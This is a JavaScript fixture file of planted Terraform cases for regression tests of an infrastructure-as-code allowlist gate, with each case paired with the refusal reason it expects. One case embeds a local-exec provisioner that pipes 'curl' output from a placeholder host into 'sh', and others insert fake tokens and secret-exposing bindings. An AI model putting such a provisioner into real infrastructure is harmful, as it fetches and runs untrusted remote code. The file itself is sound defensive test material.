// Shared V2-QA-6 IaC cases, used by test/unit/pv-iac-allowlist.test.mjs and by
// scripts/hcl-fmt-acceptance.mjs, which checks that `terraform fmt` and `tofu fmt` accept
// every case (each is valid HCL), in a deny-network sandbox with CHECKPOINT_DISABLE=1.
// Not a test file itself.

// QA's V2-QA-6 cases (from QA's provider-validation attack set),
// each valid HCL (terraform fmt accepts it), applied in memory: each must be refused for
// its own reason. The same payloads are also red controls R178-R186 on the real files.
export const QA_CASES = [
  { name: 'B1 backend "http"', file: 'versions.tf', mutate: (t) => t.replace(/(required_version = [^\n]*\n)/, '$1  backend "http" {\n    address = "https://state.example.invalid/rp"\n  }\n'), reason: /block backend "http" is not allowed inside terraform/ },
  { name: 'B2 provisioner in a resource', file: 'main.tf', mutate: (t) => t.replace(/(storage_class = "Standard"\n)/, '$1\n  provisioner "local-exec" {\n    command = "curl -s https://example.invalid/x | sh"\n  }\n'), reason: /block provisioner "local-exec" is not allowed inside resource\.cloudflare_r2_bucket\.packets/ },
  { name: 'B3 block-comment-prefixed data source', file: 'main.tf', mutate: (t) => `${t}\n/* qa */ data "http" "qa" {\n  url = "https://example.invalid/"\n}\n`, reason: /block data "http" "qa" is not allowed at top level/ },
  { name: 'B4 a secret through a plain_text binding', file: 'main.tf', mutate: (t) => t.replace('text = join(",", var.service_token_client_ids)', 'text = var.service_token_client_secret'), reason: /reference to unapproved variable var\.service_token_client_secret/ },
  { name: 'B5 previews enabled', file: 'main.tf', mutate: (t) => t.replace('previews_enabled = false', 'previews_enabled = true'), reason: /previews_enabled must be false/ },
  { name: 'B6 a literal api_token in the provider', file: 'versions.tf', mutate: (t) => t.replace('provider "cloudflare" {}', 'provider "cloudflare" {\n  api_token = "qaFAKEtoken0000000000000000000000000000"\n}'), reason: /credential-like attribute api_token/ },
  { name: 'B7 cloud {} (remote state)', file: 'versions.tf', mutate: (t) => t.replace(/(required_version = [^\n]*\n)/, '$1  cloud {\n    organization = "qa"\n  }\n'), reason: /block cloud is not allowed inside terraform/ },
  { name: 'B8 block-comment-prefixed module', file: 'main.tf', mutate: (t) => `${t}\n/**/ module "qa" {\n  source = "git::https://example.invalid/m.git"\n}\n`, reason: /block module "qa" is not allowed at top level/ },
  { name: 'B9 workers.dev disabled', file: 'main.tf', mutate: (t) => t.replace(/enabled {10}= true/, 'enabled          = false'), reason: /enabled must be true/ },
];

// Scanner cases (test/unit/hcl-scan.test.mjs). Every VALID one must be accepted by fmt;
// every INVALID one must be rejected by fmt as well as by the scanner.
export const HCL_VALID = {
  comments: '# resource "a" "b" {}\n// data "x" "y" {}\n/* module "m" {\n} */\nlocals {}\n',
  blockCommentData: '/* qa */ data "http" "qa" {\n  url = "https://example.invalid/"\n}\n',
  blockCommentModule: '/**/ module "qa" {\n  source = "git::https://example.invalid/m.git"\n}\n',
  trailingComments: 'locals {\n  a = 1 # x\n  b = 2 // y\n  c = 3 /* z */\n}\n',
  strings: 'locals {\n  a = "x \\" { resource \\"a\\" \\"b\\" { ${ "}" } $${ not } y"\n  b = "${var.x}-${local.y}"\n}\n',
  heredocs: 'locals {\n  a = <<EOT\nresource "x" "y" {\n}\n}\nEOT\n  b = <<-EOT\n    provisioner "local-exec" {}\n    EOT\n  c = 1\n}\n',
  nesting: 'terraform {\n  required_version = ">= 1.6.0"\n  cloud { organization = "qa" }\n  backend "http" {\n    address = "x"\n  }\n}\nresource "t" "n" {\n  provisioner "local-exec" {\n    connection {\n      host = "h"\n    }\n  }\n  lifecycle { ignore_changes = [tags] }\n  o = {\n    mode = "disabled"\n    inner = { k = 1 }\n  }\n  l = [{ name = "A", type = "x" }, { name = "B"\n    type = "y" }]\n}\n',
};
export const HCL_INVALID = ['resource "x" "y" { a = ', 'locals {\n  a = "unterminated\n}\n', 'locals {\n', '/* open\nlocals {}\n', 'locals { a = <<EOT\nno end\n}\n', 'locals { a = (1 }\n', '"label" {}\n', 'locals { a = 1 b = 2 }\n'];

// Every other IaC case QA has planted and the gate once caught (a06cbe6 P1-P3; 30279b8 L, M
// and F cases), re-applied in memory by the permanent regression suite in
// test/unit/pv-iac-allowlist.test.mjs (V2-QA-7 (4)). `file` is a name in
// infra/cloudflare/terraform; a new name adds a file. Not included: F2 (an unquoted resource
// label is the same HCL, so passing it is correct).
const insertAfter = (anchor, text) => (t) => t.replace(anchor, (m) => m + text);
export const QA_IAC_REGRESSION = [
  { id: 'P1-dns-record', file: 'main.tf', mutate: (t) => `${t}\nresource "cloudflare_dns_record" "qa" {\n  zone_id = "x"\n  name    = "qa"\n  type    = "CNAME"\n  content = "x.workers.dev"\n  ttl     = 1\n}\n` },
  { id: 'P2-secret_text-binding', file: 'main.tf', mutate: (t) => t.replace('type = "plain_text"', 'type = "secret_text"') },
  { id: 'P3-data-http-toplevel', file: 'main.tf', mutate: (t) => `${t}\ndata "http" "qa" {\n  url = "https://example.invalid/"\n}\n` },
  { id: 'L1-previews-via-local', file: 'main.tf', mutate: (t) => insertAfter(/locals \{\n/, '  qa_prev = true\n')(t.replace('previews_enabled = false', 'previews_enabled = local.qa_prev')) },
  { id: 'L2-binding-type-via-local', file: 'main.tf', mutate: (t) => insertAfter(/locals \{\n/, '  qa_t = "secret_text"\n')(t.replace('type = "plain_text"', 'type = local.qa_t')) },
  { id: 'L3-var-default-secret', file: 'variables.tf', mutate: (t) => t.replace(/(variable "reviewer_email_domain" \{\n  description = [^\n]*\n  type        = string\n  default     = )""/, '$1"qaFAKEsecret00000000000000000000"') },
  { id: 'M1-count-on-bucket', file: 'main.tf', mutate: insertAfter(/resource "cloudflare_r2_bucket" "packets" \{\n/, '  count         = 2\n') },
  { id: 'M2-for_each-on-worker', file: 'main.tf', mutate: insertAfter(/resource "cloudflare_workers_script" "publisher" \{\n/, '  for_each           = toset(["a", "b"])\n') },
  { id: 'M3-depends_on', file: 'main.tf', mutate: insertAfter(/resource "cloudflare_d1_database" "aliases" \{\n/, '  depends_on = [cloudflare_r2_bucket.packets]\n') },
  { id: 'F1-no-spaces-previews', file: 'main.tf', mutate: (t) => t.replace('previews_enabled = false', 'previews_enabled=true') },
  { id: 'F3-provider-in-main', file: 'main.tf', mutate: (t) => `${t}\nprovider "cloudflare" {\n  alias = "qa"\n}\n` },
  { id: 'F4b-second-terraform-backend', file: 'main.tf', mutate: (t) => `${t}\nterraform {\n  backend "local" {\n    path = "/tmp/qa.tfstate"\n  }\n}\n` },
  { id: 'F4c-second-terraform-provider-source', file: 'main.tf', mutate: (t) => `${t}\nterraform {\n  required_providers {\n    cloudflare = {\n      source = "qa-example/cloudflare"\n    }\n  }\n}\n` },
  { id: 'F4-second-terraform-block', file: 'main.tf', mutate: (t) => `${t}\nterraform {\n  required_version = ">= 1.0.0"\n}\n` },
  { id: 'F4d-second-terraform-version-loosened', file: 'main.tf', mutate: (t) => `${t}\nterraform {\n  required_version = ">= 0.1.0"\n}\n` },
  // Builder-authored: a second terraform block that repeats the pinned version, which only
  // the single-terraform-block rule refuses (the pin alone would pass it).
  { id: 'F4e-second-terraform-block-same-version (builder)', file: 'main.tf', mutate: (t) => `${t}\nterraform {\n  required_version = ">= 1.6.0"\n}\n` },
  { id: 'F5-override-file', file: 'qa_override.tf', mutate: () => 'resource "cloudflare_workers_script_subdomain" "publisher" {\n  previews_enabled = true\n}\n' },
];

// V2.1 slice 03: planted secret-in-state and access-widening cases against Access as code.
// Each is valid HCL and must be refused; the permanent regression suite replays them too.
export const ACCESS_CASES = [
  { id: 'A1-service-token-resource', file: 'access.tf', mutate: (t) => `${t}\nresource "cloudflare_zero_trust_access_service_token" "ingest" {\n  account_id = var.account_id\n  name       = "rp-publisher-test-ingest"\n}\n`, reason: /resource \["cloudflare_zero_trust_access_service_token","ingest"\] is not an approved resource/ },
  { id: 'A2-service-auth-from-a-token-resource', file: 'access.tf', mutate: (t) => t.replace('token_id = var.service_token_id', 'token_id = cloudflare_zero_trust_access_service_token.ingest.id'), reason: /publisher include must be exactly/ },
  { id: 'A3-secret-variable', file: 'variables.tf', mutate: (t) => `${t}\nvariable "service_token_secret" {\n  type      = string\n  sensitive = true\n}\n`, reason: /variable \["service_token_secret"\] is not an approved variable/ },
  { id: 'A4-secret-output', file: 'outputs.tf', mutate: (t) => `${t}\noutput "client_secret" {\n  value     = var.team_domain\n  sensitive = true\n}\n`, reason: /output \["client_secret"\] is not an approved output/ },
  { id: 'A5-client-secret-on-the-app', file: 'access.tf', mutate: (t) => t.replace('  session_duration          = "24h"\n', '  session_duration          = "24h"\n  client_secret             = var.team_domain\n'), reason: /attribute client_secret is not allowed|credential-like attribute client_secret/ },
  { id: 'A6-reviewers-everyone', file: 'access.tf', mutate: (t) => t.replace(/  include    = var\.access_mode == "exact-person"[^\n]*\n/, '  include    = [{ everyone = {} }]\n'), reason: /reviewers include must be exactly/ },
];

// V2.1 slice 04: the public target's planted cases (test/unit/v21-public-iac.test.mjs). `module`
// says which root module the case mutates: 'public' (infra/cloudflare/terraform-public) or
// 'private' (infra/cloudflare/terraform). Each is valid HCL, applied in memory, and must be
// refused for its own reason by the public module's gate or the cross-module separation check.
export const PUBLIC_CASES = [
  { id: 'PT1 an Access application in the public module', module: 'public', file: 'main.tf', mutate: (t) => `${t}\nresource "cloudflare_zero_trust_access_application" "public" {\n  account_id = var.account_id\n  name       = "rp-public"\n  type       = "self_hosted"\n}\n`, reason: /no Access in the public module \(resource cloudflare_zero_trust_access_application public\)/ },
  { id: 'PT2 an Access variable in the public module', module: 'public', file: 'variables.tf', mutate: (t) => `${t}\nvariable "team_domain" {\n  type    = string\n  default = ""\n}\n`, reason: /the public module shares the private module's variable team_domain/ },
  { id: 'PT3 the public bucket reuses the private bucket prefix', module: 'public', file: 'main.tf', mutate: (t) => t.replace('bucket_name   = "rp-public-test-${var.run_id}"', 'bucket_name   = "rp-packets-test-${var.run_id}"'), reason: /name \"rp-packets-test-\" is shared with the private module/ },
  { id: 'PT4 a backend in the public module (shared remote state)', module: 'public', file: 'versions.tf', mutate: (t) => t.replace(/(required_version = [^\n]*\n)/, '$1  backend "local" {\n    path = "../terraform/terraform.tfstate"\n  }\n'), reason: /block backend \"local\" is not allowed inside terraform/ },
  { id: 'PT5 the public module calls the private module', module: 'public', file: 'main.tf', mutate: (t) => `${t}\nmodule "private" {\n  source = "../terraform"\n}\n`, reason: /references the private module's directory \(\.\.\/terraform\)/ },
  { id: 'PT6 the public Worker runs in private mode', module: 'public', file: 'main.tf', mutate: (t) => t.replace('text = "public"', 'text = "private"'), reason: /the public Worker's bindings differ from the approved set/ },
  { id: 'PT7 an Access binding on the public Worker', module: 'public', file: 'main.tf', mutate: (t) => t.replace('      name = "MODE"', '      name = "TEAM_DOMAIN"\n      type = "plain_text"\n      text = "https://rp-test.cloudflareaccess.com"\n    },\n    {\n      name = "MODE"'), reason: /the public Worker's bindings differ from the approved set/ },
  { id: 'PT8 the public Worker reuses the private Worker name', module: 'public', file: 'variables.tf', mutate: (t) => t.replace('default     = "rp-public-test"', 'default     = "rp-publisher-test"'), reason: /name \"rp-publisher-test\" is shared with the private module/ },
  { id: 'PT9 a secret-like variable (the private signing key) in the public module', module: 'public', file: 'variables.tf', mutate: (t) => `${t}\nvariable "publisher_private_key" {\n  type = string\n}\n`, reason: /variable publisher_private_key: a secret-like input is not allowed/ },
  { id: 'PT10 the private module admits the public mode', module: 'private', file: 'variables.tf', mutate: (t) => t.replace('contains(["exact-person", "idp-domain"], var.access_mode)', 'contains(["exact-person", "idp-domain", "public"], var.access_mode)'), reason: /the private module's access_mode must not admit \"public\"/ },
  { id: 'PT11 the public D1 reuses the private D1 name', module: 'public', file: 'main.tf', mutate: (t) => t.replace('database_name = "rp-public-aliases-test-${var.run_id}"', 'database_name = "rp-aliases-test-${var.run_id}"'), reason: /name \"rp-aliases-test-\" is shared with the private module/ },
  { id: 'PT12 remote state read from the private module', module: 'public', file: 'main.tf', mutate: (t) => `${t}\ndata "terraform_remote_state" "private" {\n  backend = "local"\n  config = {\n    path = "../terraform/terraform.tfstate"\n  }\n}\n`, reason: /references the private module's directory \(\.\.\/terraform\/terraform\.tfstate\)/ },
  { id: 'PT13 a private-module resource address in the public module', module: 'public', file: 'main.tf', mutate: (t) => t.replaceAll('public_packets', 'packets'), reason: /resource cloudflare_r2_bucket\.packets is also a private-module address/ },
  { id: 'PT14 the public Worker binds a signing key that is not the variable', module: 'public', file: 'main.tf', mutate: (t) => t.replace('text = var.publisher_public_key', 'text = "canon-ed25519-pk:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"'), reason: /the public Worker's bindings differ from the approved set/ },
];
